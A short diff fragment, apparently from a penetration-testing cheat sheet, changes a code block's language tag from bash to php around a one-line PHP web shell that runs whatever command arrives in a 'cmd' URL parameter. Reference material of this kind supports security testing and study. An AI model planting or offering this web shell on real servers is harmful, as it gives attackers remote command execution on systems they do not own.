@@ -10,7 +10,7 @@
   
 * Web Shell
 
-  ```bash
+  ```php
   <?php system($_GET['cmd']);?>                               (&cmd=)
   ```
 
